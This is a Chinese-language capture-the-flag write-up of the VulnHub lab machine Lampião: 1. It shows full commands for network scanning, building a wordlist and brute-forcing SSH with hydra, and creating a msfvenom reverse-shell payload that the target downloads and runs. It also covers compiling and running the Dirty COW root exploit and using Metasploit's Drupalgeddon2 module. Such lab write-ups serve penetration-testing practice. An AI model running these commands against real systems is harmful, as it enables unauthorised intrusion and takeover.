---
title: Lampiao-1
author: Creexile
date: 2024-09-18
lastMod: 2024-09-27
summary: 'No.3'
cover: ''
category: '靶场'
draft: false
comments: false
sticky: 0
tags: [提权, MSF, 漏洞利用, 爆破, 渗透]
---

# Lampião: 1

---

No.2

> 来源: [vulnhub靶场-Lampião: 1](https://www.vulnhub.com/entry/lampiao-1,249/)
>
> 目标: Get root!
>
> 妙妙工具: python -c 'import pty; pty.spawn("/bin/bash")'

## 环境配置

kali: 192.168.56.6

ubuntu: 192.168.56.7

## 信息收集

```
nmap -sS 192.168.56.0/24
nmap -p- 192.168.56.7
nmap -A 192.168.56.7
```

可以得到详细的信息:

```
22/tcp
OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.7 (Ubuntu Linux; protocol 2.0)
80/http?
静态界面
1898/http
登录界面
Apache/2.47(Ubuntu)
```

扫描80目录无收获, 扫描1898目录, 有很多路径泄露, 不过没什么用, 仅仅得到了cms是`Drupal 7.54, 2017-02-01`

结合页面公告, 得知有一个用户是`tiago`

利用kali工具爬取该网站存在的密码, 看看能不能爆破登录

```
cewl http://182.168.56.7:1898 -w pc.txt
```

结果网站存在登录限制, 没有邮箱的前提下, 密码也找回不了, 而且注册也注册不了

![image-20240916135812689](https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20240916135812689.png)

这条路子算是废了, 试试其他方面

在Read more中, url出现`/?q=node/1`, 尝试修改后面的数字看有没有类似注入点的地方

当访问`/?q=node/2`, 返回了2个文件和一个提示:

![image-20240916144425053](https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20240916144425053.png)

音频内容为: user,tiago; 图片是二维码, 扫描结果为"Try harder! muahuahua"

## getshell

> 其实可以直接利用Drupal漏洞让msf上线, 放在最后附录了

没有密码, 剩下能用的只有22端口, 尝试爆破(就用从网站上爬下来的密码):

```
hydra -l tiago -P pc.txt 192.168.56.7 ssh
login: tiago   password: Virgulino
```

![image-20240916145346404](https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20240916145346404.png)

利用爆破得到的账号密码顺利进入, 发现为低权限

![image-20240916145842655](https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20240916145842655.png)

利用msf制作木马并反弹shell

```
# 制作木马
msfvenom -p linux/x86/meterpreter/reverse_tcp lhost=192.168.56.6 lport=10000 -f elf -o shell.elf

# 本地 开启http服务
python3 -m http.server 7890
# 靶机 下载并且运行
wget http://192.168.56.6:7890/shell.elf
chmod 777 shell.elf
./shell.elf
```

![image-20240916151525584](https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20240916151525584.png)

## 提权

先拿一些系统信息

```bash
uname -a
# Linux lampiao 4.4.0-31-generic #50~14.04.1-Ubuntu SMP Wed Jul 13 01:06:37 UTC 2016 i686 i686 i686 GNU/Linux
whoami
# tiago
gcc -v
# 有gcc环境就容易的多
# 我做完了, 我收回这句话
```

[Linux本地提权漏洞](https://wiki.96.mk/%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8/Linux/Linux%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/%EF%BC%88CVE-2016-5195%EF%BC%89%E8%84%8F%E7%89%9BLinux%20%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83/#3-exp), 尝试之后发现CVE-2016-5195(脏牛漏洞)可行

> 靶机gcc烂完了, 好多.c文件编译不了, 回来kali找了个cpp的脏牛
>
> 很急, 最后忍不住扒拉别人的wp才成功编译了这个cpp

```bash
# kali
searchsploit dirty
locate linux/local/40847.cpp
cp /usr/share/exploitdb/exploits/linux/local/40847.cpp /home/kali/Desktop/working/40847.cpp
python3 -m http.server 7890
# 靶机
wget http://192.168.56.6:7890/40847.cpp
chmod 777 40847.cpp
g++ -Wall -pedantic -o2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
./dcow
```

运行之后可以得到root的密码: dirtyCowFun

![image-20240916173405951](https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20240916173405951.png)

直接进行一个登录, 然后到达root目录下找到flag, 拿到flag

![image-20240916174455287](https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20240916174455287.png)

## 附录

在msf直接搜索cms框架漏洞, 参数配置完成后可以直接getshell

```
search Drupal
# unix/webapp/drupal_restws_exec和unix/webapp/drupal_drupalgeddon2均可
use unix/webapp/drupal_drupalgeddon2
set rport 1898
set rhost 192.168.56.7
set lhost 192.168.56.6
set lport 4445
run
```

> 但是似乎在后续步骤上出了问题,不能使用在`/tmp`下的dcow, 不过算了吧
